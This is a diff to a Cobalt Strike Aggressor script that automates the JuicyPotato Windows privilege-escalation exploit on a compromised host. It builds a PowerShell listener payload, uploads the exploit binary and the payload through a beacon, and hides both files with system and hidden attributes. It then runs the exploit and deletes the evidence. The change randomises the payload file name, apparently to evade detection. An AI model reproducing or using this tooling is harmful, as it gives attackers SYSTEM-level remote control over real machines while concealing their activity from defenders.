@@ -2,10 +2,17 @@
 
 
 sub RunJuicyPotato{
-    local('$payload $handle $call $port $id');
+    local('$payload $handle $call $port $id $fname $total');
+    @array = @("a", "b", "c", "d", "e", "f", "g", "1", "2", "3", "4", "5", "6", "!", "@", "#");
+    $total = 8;
     $call = $3['Call'];
     $port = $3['Port'];
     $id = $3['CLSID'];
+    while($total >= 0){
+        $fname = $fname.rand(@array);
+        $total = $total - 1;
+    }
+    $fname = $fname.".cmd";
     if ($call eq "CreateProcessWithTokenW"){
         $call = "t";
     }
@@ -24,15 +31,16 @@ sub RunJuicyPotato{
         return;
     }
     $payload = powershell($3['listener'], false);
-    $handle = openf(">payload.cmd");
+    $handle = openf("> $+ $fname");
     writeb($handle, $payload);
     closef($handle);
     bupload($bid, script_resource("exp/jp/jp.exe"));
-    bupload($bid, "payload.cmd");
+    bupload($bid, $fname);
     bshell($bid, "attrib \"jp.exe\" +s +h");
-    bshell($bid, "attrib \"payload.cmd\" +s +h");
-    bshell($bid,"jp.exe -t  $+ $call -l  $+ $port -p  $+ payload.cmd");
+    bshell($bid, "attrib \" $+ $fname\" +s +h");
+    bshell($bid,"jp.exe -t  $+ $call -l  $+ $port -p  $+ $fname");
     bshell($bid,"del /F /S /Q /AH jp.exe");
+    exec("cmd.exe /C del /F ".$fname);
 }
 
 sub CVE_2018_8120{
